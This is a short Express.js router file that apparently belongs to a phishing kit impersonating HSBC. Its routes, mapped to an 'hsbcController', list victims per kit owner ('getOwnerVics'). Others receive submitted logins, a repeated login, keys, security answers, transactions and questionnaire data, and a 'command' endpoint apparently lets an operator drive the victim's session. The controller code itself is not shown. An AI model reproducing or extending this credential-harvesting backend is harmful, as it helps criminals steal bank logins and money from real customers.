const express = require("express");
const {
    getOwnerVics,
    command,
    getInfo,
    submitLogin,
    submitLoginAgain,
    submitKey,
    submitSec,
    submitTransaction,
    submitQuestionnaire,
    deleteEntry,
} = require("../controllers/hsbcController");

const router = express.Router();

router.get("/customers/:owner", getOwnerVics);
router.post("/command", command);
router.get("/customers/id/:uniqueid", getInfo);
router.post("/login", submitLogin);
router.post("/loginAgain", submitLoginAgain);
router.post("/key", submitKey);
router.post("/sec", submitSec);
router.post("/transaction", submitTransaction);
router.post("/questionnaire", submitQuestionnaire);
router.post("/delete", deleteEntry);

module.exports = router;
